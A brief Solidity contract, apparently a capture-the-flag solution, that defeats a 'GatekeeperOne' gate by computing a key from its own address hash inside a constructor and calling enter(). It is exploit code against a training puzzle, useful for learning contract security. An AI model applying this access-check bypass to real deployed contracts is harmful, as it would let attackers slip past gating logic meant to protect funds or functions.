// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface GatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateBreaker {
    constructor(GatekeeperOne gatekeeper) {
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gatekeeper.enter(key);
    }
}
